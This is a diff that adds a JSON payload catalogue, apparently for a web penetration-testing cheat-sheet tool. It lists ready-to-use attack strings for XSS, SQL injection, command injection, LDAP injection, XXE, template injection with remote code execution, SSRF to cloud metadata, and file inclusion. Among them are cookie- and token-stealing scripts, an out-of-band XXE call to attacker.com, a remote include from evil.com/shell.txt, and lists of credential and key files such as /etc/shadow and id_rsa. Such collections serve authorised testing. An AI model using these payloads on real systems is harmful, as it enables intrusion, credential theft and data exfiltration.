@@ -1,0 +1,461 @@
+[
+  {
+    "name": "XSS (Cross-Site Scripting)",
+    "value": "xss",
+    "sections": [
+      {
+        "title": "Basic Payloads",
+        "items": [
+          { "subtitle": "Script Tag", "content": "<script>alert('XSS')</script>" },
+          { "subtitle": "Image OnError", "content": "<img src=x onerror=alert(1)>" },
+          { "subtitle": "SVG OnLoad", "content": "<svg/onload=alert(1)>" },
+          { "subtitle": "Body OnLoad", "content": "<body onload=alert(1)>" },
+          { "subtitle": "Script Tag Obfuscated", "content": "<scr<script>ipt>alert('XSS')</scr<script>ipt>" },
+          { "subtitle": "Closing Tag Injection", "content": "\"><script>alert(\"XSS\")</script>" },
+          { "subtitle": "String.fromCharCode", "content": "\"><script>alert(String.fromCharCode(88,83,83))</script>" }
+        ]
+      },
+      {
+        "title": "Data Grabbers (Cookie Stealing)",
+        "items": [
+          { "subtitle": "Document Cookie Redirect", "content": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>" },
+          { "subtitle": "LocalStorage Token Redirect", "content": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>" },
+          { "subtitle": "Image Source Cookie", "content": "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>" },
+          { "subtitle": "Image Source Token", "content": "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>" }
+        ]
+      },
+      {
+        "title": "Image Vectors",
+        "items": [
+          { "subtitle": "Img OnError", "content": "<img src=x onerror=alert('XSS');>" },
+          { "subtitle": "Img OnError Comment", "content": "<img src=x onerror=alert('XSS')//" },
+          { "subtitle": "Img OnError CharCode", "content": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>" },
+          { "subtitle": "Img Nested OnError", "content": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>" },
+          { "subtitle": "Img Eval Src", "content": "<img src=x:alert(alt) onerror=eval(src) alt=xss>" },
+          { "subtitle": "Closing Tag Img", "content": "\"><img src=x onerror=alert(\"XSS\");>" }
+        ]
+      },
+      {
+        "title": "Markdown XSS",
+        "items": [
+          { "subtitle": "Link Javascript", "content": "[a](javascript:prompt(document.cookie))" },
+          { "subtitle": "Link Javascript Spaces", "content": "[a](j a v a s c r i p t:prompt(document.cookie))" },
+          { "subtitle": "Link Base64", "content": "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)" },
+          { "subtitle": "Link OnError Throw", "content": "[a](javascript:window.onerror=alert;throw%201)" }
+        ]
+      },
+      {
+        "title": "SVG Vectors",
+        "items": [
+          { "subtitle": "SVG OnLoad Domain", "content": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>" },
+          { "subtitle": "SVG CDATA Script", "content": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>" },
+          { "subtitle": "SVG ForeignObject", "content": "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>" },
+          { "subtitle": "SVG Title", "content": "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>" }
+        ]
+      },
+      {
+        "title": "Bypass & Obfuscation",
+        "items": [
+          { "subtitle": "Case Insensitive", "content": "<ScRiPt>alert(1)</sCrIpT>" },
+          { "subtitle": "Protocol Resolution", "content": "<a href=\"javas\r\ncript:alert(1)\">Click me</a>" },
+          { "subtitle": "Octal Encoding", "content": "<a href=javascript:\\74\\151\\164\\154\\145\\75\\141\\154\\145\\162\\164\\50\\61\\51>Click Me</a>" },
+          { "subtitle": "Eval Alert", "content": "eval('ale'+'rt(0)');" },
+          { "subtitle": "Function Alert", "content": "Function('ale'+'rt(1)')();" },
+          { "subtitle": "New Function Template", "content": "new Function`alert`6``;" },
+          { "subtitle": "SetTimeout", "content": "setTimeout('ale'+'rt(2)');" },
+          { "subtitle": "SetInterval", "content": "setInterval('ale'+'rt(10)');" },
+          { "subtitle": "Set Constructor", "content": "Set.constructor('ale'+'rt(13)')();" }
+        ]
+      },
+      {
+        "title": "Polyglots",
+        "items": [
+          { "subtitle": "Common Polyglot", "content": "javascript://%250Aalert(1)//\"/*\\'/*\\'/*--></script><img src=x onerror=alert(1)>" },
+          { "subtitle": "Ahmed Elsobky's Polyglot", "content": "\">><marquee><img src=x onerror=confirm(1)></marquee>\"</textarea>’>”></iframe><script>alert(1)</script>" }
+        ]
+      }
+    ]
+  },
+  {
+    "name": "SQL Injection",
+    "value": "sqli",
+    "sections": [
+        {
+            "title": "Number of column",
+            "items": [
+                { "subtitle": "MySQL/MSSQL/PGSQL", "content": "'UNION SELECT NULL,NULL,NULL -- -" },
+                { "subtitle": "ORACLE", "content": "'UNION SELECT NULL,NULL,NULL FROM DUAL -- -" },
+                { "subtitle": "MYSQL/MSSQL/PGSQL/ORACLE - (add +1 until you get an exception)", "content": "' UNION ORDER BY 1 -- -" }
+            ]
+        },
+        {
+            "title": "Database enumeration",
+            "items": [
+                { "subtitle": "MySQL/MSSQL", "content": "' UNION SELECT @@version -- -" },
+                { "subtitle": "Oracle", "content": "' UNION SELECT banner from v$version -- -" },
+                { "subtitle": "Oracle(2nd method)", "content": "' UNION SELECT version from v$instance -- -" },
+                { "subtitle": "Postgres", "content": "' UNION SELECT version() -- -" }
+            ]
+        },
+        {
+            "title": "Tablename enumeration",
+            "items": [
+                { "subtitle": "MySQL/MSSQL/Postgres", "content": "' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -" },
+                { "subtitle": "Oracle", "content": "' UNION SELECT table_name,NULL FROM all_tables  -- -" }
+            ]
+        },
+        {
+            "title": "Column name enumeration",
+            "items": [
+                { "subtitle": "MySQL/MSSQL/Postgres", "content": "' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name=\"X\" -- -" },
+                { "subtitle": "Oracle", "content": "' UNION SELECT column_name,NULL FROM all_tab_columns where table_name=\"X\"  -- -" }
+            ]
+        },
+        {
+            "title": "Column values concatenation",
+            "items": [
+                { "subtitle": "MySQL/Postgres", "content": "' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -" },
+                { "subtitle": "MySQL(2nd method)", "content": "' UNION SELECT col1 ':' col2 from table_name limit 1 -- -" },
+                { "subtitle": "Oracle / Postgres", "content": "' UNION SELECT select col1 ||':'||col2, null FROM  where table_name=\"X\"  -- -" },
+                { "subtitle": "MSSQL", "content": "' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -" }
+            ]
+        },
+        {
+            "title": "Conditional ( Error Based )",
+            "items": [
+                { "subtitle": "MySQL", "content": "' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -" },
+                { "subtitle": "Postgres", "content": "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -" },
+                { "subtitle": "Oracle", "content": "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -" },
+                { "subtitle": "MSSQL", "content": "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -" }
+            ]
+        },
+        {
+            "title": "Time-Based",
+            "items": [
+                { "subtitle": "Generic", "content": ",(select * from (select(sleep(10)))a)" },
+                { "subtitle": "MSSQL", "content": "';WAITFOR DELAY '0:0:30'--" }
+            ]
+        },
+        {
+            "title": "Generic Error Based Payloads",
+            "items": [
+                { "subtitle": "MySQL", "content": "' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -" },
+                { "subtitle": "Postgres", "content": "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -" },
+                { "subtitle": "Oracle", "content": "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -" },
+                { "subtitle": "MSSQL", "content": "' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -" }
+            ]
+        },
+        {
+            "title": "Authentication Based Payloads",
+            "items": [
+                { "subtitle": "1", "content": "or true--" },
+                { "subtitle": "2", "content": "\") or true--" },
+                { "subtitle": "3", "content": "') or true--" },
+                { "subtitle": "4", "content": "admin') or ('1'='1'--" },
+                { "subtitle": "5", "content": "admin') or ('1'='1'#" },
+                { "subtitle": "6", "content": "admin') or ('1'='1'/" }
+            ]
+        },
+        {
+            "title": "Order by and UNION Based Payloads",
+            "items": [
+                { "subtitle": "1", "content": "1' ORDER BY 1--+" },
+                { "subtitle": "2", "content": "1' ORDER BY 2--+" },
+                { "subtitle": "3", "content": "1' ORDER BY 3--+" },
+                { "subtitle": "4", "content": "1' ORDER BY 1,2--+" },
+                { "subtitle": "5", "content": "1' ORDER BY 1,2,3--+" },
+                { "subtitle": "6", "content": "1' GROUP BY 1,2,--+" },
+                { "subtitle": "7", "content": "1' GROUP BY 1,2,3--+" },
+                { "subtitle": "8", "content": "' GROUP BY columnnames having 1=1 --" },
+                { "subtitle": "9", "content": "-1' UNION SELECT 1,2,3--+" },
+                { "subtitle": "10", "content": "' UNION SELECT sum(columnname ) from tablename --" },
+                { "subtitle": "11", "content": "-1 UNION SELECT 1 INTO @,@" },
+                { "subtitle": "12", "content": "-1 UNION SELECT 1 INTO @,@,@" },
+                { "subtitle": "13", "content": "1 AND (SELECT * FROM Users) = 1" },
+                { "subtitle": "14", "content": "' AND MID(VERSION(),1,1) = '5';" },
+                { "subtitle": "15", "content": "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --" }
+            ]
+        }
+    ]
+  },
+  {
+    "name": "Command Injection",
+    "value": "cmd_injection",
+    "sections": [
+      {
+        "title": "Separators",
+        "items": [
+          { "subtitle": "Classic", "content": "; ls -la" },
+          { "subtitle": "Pipe", "content": "| id" },
+          { "subtitle": "Double Pipe (OR)", "content": "|| cat /etc/passwd" },
+          { "subtitle": "Ampersand", "content": "& whoami" },
+          { "subtitle": "Double Ampersand (AND)", "content": "&& net user" },
+          { "subtitle": "Backticks", "content": "`id`" },
+          { "subtitle": "Subshell", "content": "$(whoami)" }
+        ]
+      },
+      {
+        "title": "Blind Injection",
+        "items": [
+          { "subtitle": "Sleep (Linux)", "content": "; sleep 10" },
+          { "subtitle": "Ping (Linux)", "content": "; ping -c 10 127.0.0.1" },
+          { "subtitle": "Ping (Windows)", "content": "& ping -n 10 127.0.0.1" },
+          { "subtitle": "Timeout (Windows)", "content": "& timeout /t 10" }
+        ]
+      }
+    ]
+  },
+  {
+    "name": "LDAP Injection",
+    "value": "ldap",
+    "sections": [
+      {
+        "title": "Basic Injection",
+        "items": [
+          { "subtitle": "All Objects", "content": "*" },
+          { "subtitle": "Admin Check Bypass", "content": "*)(uid=*))(|(uid=*" },
+          { "subtitle": "True Condition", "content": ")(cn=*))" },
+          { "subtitle": "Universal Password", "content": "*()|&'" }
+        ]
+      },
+      {
+        "title": "Blind LDAP",
+        "items": [
+          { "subtitle": "Attribute Discovery", "content": "(&(objectClass=*)(objectClass=*))" },
+          { "subtitle": "Boolean Inference", "content": "(&(uid=admin)(password=a*))" }
+        ]
+      }
+    ]
+  },
+  {
+    "name": "XXE (XML External Entity)",
+    "value": "xxe",
+    "sections": [
+      {
+        "title": "Basic XXE",
+        "items": [
+          { "subtitle": "Linux /etc/passwd", "content": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>" },
+          { "subtitle": "Windows win.ini", "content": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///c:/windows/win.ini\">]><root>&test;</root>" }
+        ]
+      },
+      {
+        "title": "Blind XXE",
+        "items": [
+          { "subtitle": "Out-of-Band (OOB)", "content": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;]>" }
+        ]
+      },
+      {
+        "title": "Wrappers",
+        "items": [
+          { "subtitle": "PHP Filter (Base64)", "content": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&test;</root>" },
+          { "subtitle": "Expect Wrapper", "content": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"expect://id\">]><root>&test;</root>" }
+        ]
+      }
+    ]
+  },
+  {
+    "name": "SSTI (Server Side Template Injection)",
+    "value": "ssti",
+    "sections": [
+      {
+        "title": "Polyglot",
+        "items": [
+          { "subtitle": "Universal Polyglot", "content": "${{<%[%'\"}}%" }
+        ]
+      },
+      {
+        "title": "Twig (PHP)",
+        "items": [
+          { "subtitle": "Basic Math", "content": "{{7*7}}" },
+          { "subtitle": "String Math", "content": "{{7*'7'}}" },
+          { "subtitle": "Division by Zero", "content": "{{1/0}}" },
+          { "subtitle": "Undefined Variable", "content": "{{foobar}}" }
+        ]
+      },
+      {
+        "title": "Jinja2 (Python)",
+        "items": [
+          { "subtitle": "Basic Math", "content": "{{7*7}}" },
+          { "subtitle": "String Math", "content": "{{7*'7'}}" },
+          { "subtitle": "Undefined Variable", "content": "{{foobar}}" },
+          { "subtitle": "Config Dump", "content": "{{config.items()}}" }
+        ]
+      },
+      {
+        "title": "FreeMarker (Java)",
+        "items": [
+          { "subtitle": "Basic Math", "content": "{{7*7}}" },
+          { "subtitle": "Legacy Math", "content": "#{7*7}" },
+          { "subtitle": "String Math", "content": "${7*'7'}" },
+          { "subtitle": "Undefined Variable", "content": "${foobar}" },
+          { "subtitle": "RCE", "content": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }" }
+        ]
+      },
+      {
+        "title": "EL (Java)",
+        "items": [
+          { "subtitle": "String Test", "content": "${\"aaaa\"}" },
+          { "subtitle": "Math Test", "content": "${99999+1}" },
+          { "subtitle": "Legacy Math", "content": "#{7*7}" },
+          { "subtitle": "Double Curly", "content": "${{7*7}}" },
+          { "subtitle": "Request Object", "content": "${{request}}" }
+        ]
+      },
+      {
+        "title": "Nunjucks (NodeJS)",
+        "items": [
+          { "subtitle": "Basic Math", "content": "{{7*7}}" },
+          { "subtitle": "Undefined Variable", "content": "{{foo}}" },
+          { "subtitle": "Legacy Math", "content": "#{7*7}" },
+          { "subtitle": "Console Log", "content": "{{console.log(1)}}" }
+        ]
+      },
+      {
+        "title": "ERB (Ruby)",
+        "items": [
+          { "subtitle": "Basic Math", "content": "{{7*7}}" },
+          { "subtitle": "Tag Math", "content": "<%= 7*7 %>" },
+          { "subtitle": "Tag Variable", "content": "<%= foobar %>" }
+        ]
+      },
+      {
+        "title": "Tornado (Python)",
+        "items": [
+          { "subtitle": "Basic Math", "content": "{{7*7}}" },
+          { "subtitle": "Dollar Math", "content": "${7*7}" },
+          { "subtitle": "Undefined Variable", "content": "{{foobar}}" },
+          { "subtitle": "String Math", "content": "{{7*'7'}}" }
+        ]
+      },
+      {
+        "title": "ASP",
+        "items": [
+          { "subtitle": "Tag Math", "content": "<%= 7*7 %>" },
+          { "subtitle": "Tag String", "content": "<%= \"foo\" %>" },
+          { "subtitle": "Tag Variable", "content": "<%= foo %>" },
+          { "subtitle": "Response Write", "content": "<%= response.write(date()) %>" }
+        ]
+      },
+      {
+        "title": "Mojolicious (Perl)",
+        "items": [
+          { "subtitle": "Tag Math", "content": "<%= 7*7 %>" },
+          { "subtitle": "Tag Variable", "content": "<%= foobar %>" }
+        ]
+      }
+    ]
+  },
+  {
+    "name": "SSRF (Server Side Request Forgery)",
+    "value": "ssrf",
+    "sections": [
+      {
+        "title": "Localhost Access",
+        "items": [
+          { "subtitle": "Basic Localhost", "content": "http://127.0.0.1:80" },
+          { "subtitle": "Localhost IPv6", "content": "http://[::]:80/" },
+          { "subtitle": "Decimal IP", "content": "http://2130706433/" },
+          { "subtitle": "DNS Rebinding", "content": "http://localtest.me" }
+        ]
+      },
+      {
+        "title": "Cloud Metadata",
+        "items": [
+          { "subtitle": "AWS/GCP/Azure", "content": "http://169.254.169.254/latest/meta-data/" },
+          { "subtitle": "Oracle Cloud", "content": "http://192.0.0.192/latest/" },
+          { "subtitle": "Digital Ocean", "content": "http://169.254.169.254/metadata/v1.json" }
+        ]
+      },
+      {
+        "title": "Protocols",
+        "items": [
+          { "subtitle": "File Protocol", "content": "file:///etc/passwd" },
+          { "subtitle": "Gopher Protocol", "content": "gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40site.com" },
+          { "subtitle": "Dict Protocol", "content": "dict://127.0.0.1:11211/stat" }
+        ]
+      }
+    ]
+  },
+  {
+    "name": "LFI (Local File Inclusion)",
+    "value": "lfi",
+    "sections": [
+      {
+        "title": "Basic Payloads",
+        "items": [
+          { "subtitle": "Standard Linux", "content": "../../../../../etc/passwd" },
+          { "subtitle": "Standard Windows", "content": "..\\..\\..\\..\\..\\windows\\win.ini" },
+          { "subtitle": "Root Directory", "content": "/etc/passwd" },
+          { "subtitle": "Directory Traversal Example", "content": "foo.php?file=../../../../../../../etc/passwd" },
+          { "subtitle": "PHP Wrapper Expect", "content": "expect://ls" },
+          { "subtitle": "PHP Wrapper Filter", "content": "php://filter/convert.base64-encode/resource=index.php" },
+          { "subtitle": "PHP RFI Example", "content": "http://example.com/index.php?page=http://evil.com/shell.txt" }
+        ]
+      },
+      {
+        "title": "Bypass Techniques",
+        "items": [
+          { "subtitle": "Null Byte", "content": "../../../../../etc/passwd%00" },
+          { "subtitle": "Double URL Encode", "content": "%252e%252e%252fetc%252fpasswd" },
+          { "subtitle": "Nested Traversal", "content": "....//....//....//etc/passwd" },
+          { "subtitle": "UTF-8 Encoding", "content": "..%c0%af..%c0%af..%c0%afetc/passwd" }
+        ]
+      },
+      {
+        "title": "Linux Interesting Files",
+        "items": [
+          { "content": "/etc/passwd" },
+          { "content": "/etc/shadow" },
+          { "content": "/etc/issue" },
+          { "content": "/etc/group" },
+          { "content": "/etc/hostname" },
+          { "content": "/etc/ssh/ssh_config" },
+          { "content": "/etc/ssh/sshd_config" },
+          { "content": "/root/.ssh/id_rsa" },
+          { "content": "/root/.ssh/authorized_keys" },
+          { "content": "/home/$USER/.ssh/authorized_keys" },
+          { "content": "/home/$USER/.ssh/id_rsa" },
+          { "content": "/proc/[0-9]*/fd/[0-9]*" },
+          { "content": "/proc/mounts" },
+          { "content": "/home/$USER/.bash_history" },
+          { "content": "/var/run/secrets/kubernetes.io/serviceaccount" },
+          { "content": "/var/lib/mlocate/mlocate.db" }
+        ]
+      },
+      {
+        "title": "Apache Interesting Files",
+        "items": [
+          { "content": "/etc/apache2/apache2.conf" },
+          { "content": "/usr/local/etc/apache2/httpd.conf" },
+          { "content": "/etc/httpd/conf/httpd.conf" },
+          { "content": "/var/log/httpd/access_log" },
+          { "content": "/var/log/apache2/access.log" },
+          { "content": "/var/log/httpd-access.log" },
+          { "content": "/var/log/apache/access.log" },
+          { "content": "/var/log/apache/error.log" }
+        ]
+      },
+      {
+        "title": "MySQL Interesting Files",
+        "items": [
+          { "content": "/var/lib/mysql/mysql/user.frm" },
+          { "content": "/var/lib/mysql/mysql/user.MYD" },
+          { "content": "/var/lib/mysql/mysql/user.MYI" }
+        ]
+      },
+      {
+        "title": "Windows Interesting Files",
+        "items": [
+          { "content": "/boot.ini" },
+          { "content": "/autoexec.bat" },
+          { "content": "/windows/system32/drivers/etc/hosts" },
+          { "content": "/windows/repair/SAM" },
+          { "content": "/windows/panther/unattended.xml" },
+          { "content": "/windows/panther/unattend/unattended.xml" },
+          { "content": "/windows/system32/license.rtf" },
+          { "content": "/windows/system32/eula.txt" }
+        ]
+      }
+    ]
+  }
+]
